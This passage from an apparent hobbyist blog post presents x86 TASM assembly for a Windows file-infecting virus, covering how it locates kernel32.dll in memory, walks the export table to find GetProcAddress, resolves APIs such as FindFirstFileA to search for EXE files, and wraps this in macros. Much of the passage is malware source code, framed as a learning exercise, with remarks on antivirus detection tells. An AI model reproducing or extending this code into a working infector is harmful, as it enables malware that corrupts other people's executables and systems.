</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#75715e>; We know the DLL is section aligned so clear out the lower byte of ESI to</span>
</span></span><span style=display:flex><span><span style=color:#75715e>; begin the search at the section start.</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>and</span> esi, <span style=color:#ae81ff>0FFFF0000h</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>@@findpe:
</span></span><span style=display:flex><span>  <span style=color:#75715e>; If ESI points at the value &#39;MZ&#39; it indicates the section contains</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>; a PE executable and we know it&#39;s the base addr of kernel32.dll</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>cmp</span> <span style=color:#66d9ef>word</span> ptr (IMAGE_DOS_HEADER [esi]).Magic, IMAGE_DOS_SIGNATURE
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>je</span> @@findgetprocaddr
</span></span><span style=display:flex><span>  <span style=color:#75715e>; Otherwise move back by the section alignment and try checking </span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>; for the DOS header magic bytes again.</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>sub</span> esi, PE_SECTION_ALIGNMENT
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>jmp</span> @@findpe
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>@@findgetprocaddr:
</span></span><span style=display:flex><span><span style=color:#75715e>; If execution gets here we found the kernel base address in ESI. Woohoo</span>
</span></span></code></pre></td></tr></table></div></div><p>One <em>disadvantage</em> of this technique is that it only works if the virus code is executed <strong>before</strong> the host program code. If the real program is run first then the state of the stack will be unpredictable. I might have to revisit this strategy in the future if I mess around with more sophisticated entrypoint obfuscation but for now it will work reliably.</p><h2 id=dll-exports>DLL Exports <a href=#dll-exports class=anchor>üîó</a></h2><p>Knowing the base address of where <code>kernel32.dll</code> is loaded lets me move on to <code>apifind</code>&rsquo;s next challenge: finding the <code>GetProcAddress</code> function export in <code>kernel32.dll</code>.</p><p>The PE format is responsible for describing how a DLL exports a function for consumption by another program. The &ldquo;Peering inside PE&rdquo; article&rsquo;s section on <a href="https://docs.microsoft.com/en-us/previous-versions/ms809762%28v=msdn.10%29#pe-file-exports" target=_blank rel=noopener>&ldquo;PE File Exports&rdquo;</a> was an invaluable resource for understanding PE exports.</p><p>To summarize, <code>kernel32.dll</code> has an <code>IMAGE_EXPORT_DIRECTORY</code> structure that is predictably located (it&rsquo;s always the first data directory after the section table of the PE structure). Inside of the <code>IMAGE_EXPORT_DIRECTORY</code> structure are pointers to three arrays:</p><ol><li><code>AddressOfFunctions</code> - which holds pointers to the RVA of each exported DLL function.</li><li><code>AddressOfNames</code> - which holds pointers to the null terminated name of each exported DLL function.</li><li><code>AddressOfNameOrdinals</code> - which holds the ordinal (<em>basically an ID number</em>) of each exported DLL function.</li></ol><p>All three arrays have the same number of entries and can be accessed in parallel. That is, if I can find the index of a specific function name in <code>AddressOfNames</code> I can use that index to find the ordinal in <code>AddressOfNameOrdinals</code> and then the function pointer in <code>AddressOfFunctions</code> using the ordinal.</p><p>The <a href=https://github.com/cpu/vexation/blob/8c24ef87338b5b2558def7866cebc37d37a4e4ec/apifind/apifind.asm#L94-L199 target=_blank rel=noopener>x86 assembly that accomplishes the above</a> is a little bit gnarly but I did my best to comment it thoroughly. At a high level the code:</p><ol><li>Finds the <code>kernel32.dll</code> <code>IMAGE_EXPORT_DIRECTORY</code> structure.</li><li>Loops through <code>AddressOfNames</code> to find the entry matching <code>"GetProcAddress\0"</code></li><li>Uses the matching offset in <code>AddressOfNames</code> to find the ordinal for <code>GetProcAddress</code> in <code>AddressOfNameOrdinals</code></li><li>Uses the ordinal for <code>GetProcAddress</code> to find the memory address of the exported function in <code>AddressOfFunctions</code>.</li></ol><p>Once the address of the <code>GetProcAddress</code> function from <code>kernel32.dll</code> is known the fun can really begin.</p><h2 id=link-it-yourself>Link it yourself <a href=#link-it-yourself class=anchor>üîó</a></h2><p>The virus code from <code>pijector</code> uses a handful of <code>kernel32.dll</code> functions (<code>FindFirstFileA</code>, <code>FindNextFileA</code>, <code>lstrcpy</code>, <code>CreateFileA</code>, etc). Using <code>GetProcAddress</code> makes for an easy way to find the address of each without needing to do as much work spelunking the <code>kernel32.dll</code> export table.</p><p>To find the address of <code>FindFirstFileA</code> the <code>apifind.asm</code> code uses the discovered <code>GetProcAddress</code> address (held in a var <code>GetProcAddress</code>):</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#75715e>; Put the kernel32.dll base address in ebx</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> ebx, [kernel32Base]
</span></span><span style=display:flex><span><span style=color:#75715e>; Put the offset of the null terminated string &#34;FindFirstFileA\0&#34; into ecx</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> ecx, offset szFindFirstFileA
</span></span><span style=display:flex><span><span style=color:#75715e>; Invoke GetProcAddress(ebx, ecx) by putting the GetProcAddress function&#39;s</span>
</span></span><span style=display:flex><span><span style=color:#75715e>; address in eax and calling it.</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> eax, [GetProcAddress]
</span></span><span style=display:flex><span><span style=color:#a6e22e>call</span> (type procGetProcAddress) PTR eax, ebx, ecx
</span></span><span style=display:flex><span><span style=color:#75715e>; If the return was zero there was an error</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>or</span> eax, eax
</span></span><span style=display:flex><span><span style=color:#a6e22e>jz</span> @@exit
</span></span><span style=display:flex><span><span style=color:#75715e>; Otherwise save the discovered function address for FindFirstFileA in a var</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>mov</span> [FindFirstFileA], eax
</span></span></code></pre></td></tr></table></div></div><p>For every function the virus wants to &ldquo;link&rdquo; it needs two things:</p><ol><li>The name of the API in a null terminated string (e.g. <code>szFindFirstFileA</code> above holds <code>"FindFirstFileA\0"</code>).</li><li>A four byte var to hold the function pointer (e.g. <code>FindFirstFileA</code> above)</li></ol><p>I chose the most naive solution for the first part and included the literal strings in the virus code. That&rsquo;s an obvious tell for AV since the virus code will now have function name strings like <code>"GetProcAddress\0"</code> and <code>"FindFirstFileA\0"</code> <a href=https://github.com/cpu/vexation/blob/master/apisafejector/apisafejector.exe.strings.txt target=_blank rel=noopener>embedded in each infected file</a> that aren&rsquo;t present in the file&rsquo;s PE imports. There are lots of various tricks for working around this but for now I&rsquo;m ignoring AV &ldquo;stealth&rdquo;.</p><p>One of the other challenges I encountered was finding a way to use raw function pointers with <code>TASM</code> while still having it handle the <code>stdcall</code> calling convention and argument checking. The solution to this was adding explicit <code>PROCDESC</code> types to reference for each <code>call</code> of a raw pointer.</p><p>You might notice that weird <code>call</code> syntax in the fragment above. It relies on a <code>procGetProcAddress</code> <code>PROCDESC</code>. In brief <code>PROCDESC</code> is a bit of <code>TASM</code> syntax that lets me give the assembler a description of the function I&rsquo;m calling so it can use the correct calling convention and check the arguments. For <code>GetProcAddress</code> the <code>procGetProcAddress</code> <code>PROCDESC</code> looks like:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#66d9ef>proc</span>GetProcAddress PROCDESC stdcall baseAddr:<span style=color:#66d9ef>DWORD</span>,name:<span style=color:#66d9ef>DWORD</span>
</span></span></code></pre></div><p>It indicates that the <code>stdcall</code> calling convention should be used and there are two <code>DWORD</code> arguments: the base address of a DLL and a pointer to the name of the exported function to lookup.</p><p>The <code>apifind.asm</code> code uses a similar <code>PROCDESC</code> to invoke the <code>kernel32.FindFirstFileA</code> function by the address found with <code>GetProcAddress</code>:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#66d9ef>proc</span>FindFirstFileA PROCDESC stdcall fileName:<span style=color:#66d9ef>DWORD</span>,findData:<span style=color:#66d9ef>DWORD</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>; &lt;snipped&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>@@tryAPI:
</span></span><span style=display:flex><span>  <span style=color:#75715e>; eax == lpFileName argument == &#34;*.exe\0&#34;</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> eax, offset findFilter
</span></span><span style=display:flex><span>  <span style=color:#75715e>; ebx == lpFindFileData argument</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> ebx, offset findData
</span></span><span style=display:flex><span>  <span style=color:#75715e>; edx == resolved address of FindFirstFileA in kernel32.dll</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> edx, [FindFirstFileA]
</span></span><span style=display:flex><span>  <span style=color:#75715e>; Invoke FindFirstFileA( eax, ebx ) by calling edx</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>call</span> (type procFindFirstFileA) PTR edx, eax, ebx
</span></span><span style=display:flex><span>  <span style=color:#75715e>; If we got an invalid handle from FindFirstFileA that means there were </span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>; no EXEs in the directory.</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>cmp</span> eax, INVALID_HANDLE_VALUE
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>je</span> @@exit
</span></span><span style=display:flex><span>  <span style=color:#75715e>; Otherwise an exe was found and the handle should be saved</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> [findHandle], eax
</span></span></code></pre></td></tr></table></div></div><p>End-to-end this is certainly more verbose than the simple <code>call &lt;api></code> that normal programs can get away with but virus code is &ldquo;special&rdquo; ;-D</p><h1 id=convenient-macros>Convenient Macros <a href=#convenient-macros class=anchor>üîó</a></h1><p>Tackling the clunkyness was my next task. I decided it made sense to write some quick macros that would make it easier to find required API addresses and invoke them. Borland Turbo Assembler&rsquo;s Macro language is pretty powerful and I was able to get decent results quickly, even as a complete assembly language programming novice.</p><p>To make it easy to see how the macros replaced the initial code I made a separate <a href=https://github.com/cpu/vexation/tree/master/apifind2 target=_blank rel=noopener><code>apifind2</code></a> project that took the code from <a href=https://github.com/cpu/vexation/tree/master/apifind target=_blank rel=noopener><code>apifind1</code></a> and introduced the new macros.</p><p>I created four macros, each addressing one of the four parts involved in the process of using an exported DLL function resolved by the virus at runtime:</p><ol><li>Making a name variable and a pointer variable for each API.</li><li>Describing the API procedure and its arguments.</li><li>Populating the pointer variable by finding the name.</li><li>Invoking the described procedure using the pointer.</li></ol><h2 id=required_api>REQUIRED_API <a href=#required_api class=anchor>üîó</a></h2><p>The macro I wrote for declaring a name variable and a pointer variable for each API is called <code>REQUIRED_API</code>:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#75715e>; REQUIRED_API is a macro that defines two vars:</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;  1. a zero terminated API name</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;  2. a pointer to the API function</span>
</span></span><span style=display:flex><span><span style=color:#75715e>; The pointer is populated at runtime by finding the</span>
</span></span><span style=display:flex><span><span style=color:#75715e>; API name in kernel32.dll using LINK_API</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>; e.g.</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;   REQUIRED_API ExitProcess</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>; would result in:</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;   szExitProcess DB &#34;ExitProcess&#34;, 0</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;   ExitProcess   DD 0</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>REQUIRED_API</span> MACRO var:REQ
</span></span><span style=display:flex><span>  <span style=color:#75715e>;; pointer to a null terminated string with the API name</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>sz</span><span style=color:#f92672>&amp;</span>var  DB <span style=color:#e6db74>&#34;&amp;var&#34;</span>,<span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>;; pointer to the API function</span>
</span></span><span style=display:flex><span>  <span style=color:#960050;background-color:#1e0010>&amp;</span><span style=color:#66d9ef>var</span><span style=color:#66d9ef>    DD</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>END</span>M
</span></span></code></pre></td></tr></table></div></div><h2 id=desc_runtime_api>DESC_RUNTIME_API <a href=#desc_runtime_api class=anchor>üîó</a></h2><p>The macro I wrote for generating a <code>PROCDESC</code> for each API is called <code>DESC_RUNTIME_API</code>:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#75715e>; DESC_RUNTIME_API is a macro that creates a PROCDESC prefixed</span>
</span></span><span style=display:flex><span><span style=color:#75715e>; with &#34;proc&#34; for a given proc name. It&#39;s described as having the</span>
</span></span><span style=display:flex><span><span style=color:#75715e>; given arguments and using stdcall convention.</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>; e.g.</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;   DESC_RUNTIME_API GetProcAddress,&lt;baseAddr:DWORD,szName:DWORD&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>; would result in:</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;   procGetProcAddress PROCDESC stdcall baseAddr:DWORD,szName:DWORD</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>; NOTE(@cpu): Don&#39;t forget to use &lt;&gt; around the procedure&#39;s arguments</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;             or they&#39;ll be treated as separate arguments to the macro</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;             instead of one argument to the macro describing all of the</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;             arguments for the procedure&#39;s PROCDESC.</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>DESC_RUNTIME_API</span> MACRO name:REQ,args
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>proc</span><span style=color:#f92672>&amp;</span>name PROCDESC stdcall <span style=color:#f92672>&amp;</span>args
</span></span><span style=display:flex><span><span style=color:#66d9ef>END</span>M
</span></span></code></pre></td></tr></table></div></div><h2 id=link_api>LINK_API <a href=#link_api class=anchor>üîó</a></h2><p>The macro I wrote to find the <code>kernel32.dll</code> function address for a <code>REQUIRED_API</code> is called <code>LINK_API</code>:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#75715e>; LINK_API finds the given REQUIRED_API in kernel32.dll by its sz pointer</span>
</span></span><span style=display:flex><span><span style=color:#75715e>; using GetProcAddress. The API address is saved in the REQUIRED_API</span>
</span></span><span style=display:flex><span><span style=color:#75715e>; function pointer for use with CALL_RUNTIME_API. A variable called</span>
</span></span><span style=display:flex><span><span style=color:#75715e>; kernel32Base is expected to hold the kernel32.dll base address</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>LINK_API</span> MACRO var:REQ
</span></span><span style=display:flex><span>    <span style=color:#75715e>; Add the kernel32.dll base address</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>mov</span> ebx, [kernel32Base]
</span></span><span style=display:flex><span>    <span style=color:#75715e>; Put the offset of the null terminated string with the</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>; required API name into ecx</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>mov</span> ecx, offset sz<span style=color:#f92672>&amp;</span>var
</span></span><span style=display:flex><span>    <span style=color:#75715e>; Invoke GetProcAddress( kernel32.dll, sz&amp;var )</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>CALL_RUNTIME_API</span> GetProcAddress, <span style=color:#f92672>&lt;</span>ebx, ecx<span style=color:#f92672>&gt;</span>, eax
</span></span><span style=display:flex><span>    <span style=color:#75715e>; If the return was zero there was an error</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>or</span> eax, eax
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>jz</span> @@exit
</span></span><span style=display:flex><span>    <span style=color:#75715e>; Otherwise save the function address into the pointer var</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>mov</span> [<span style=color:#f92672>&amp;</span>var], eax
</span></span><span style=display:flex><span><span style=color:#66d9ef>END</span>M
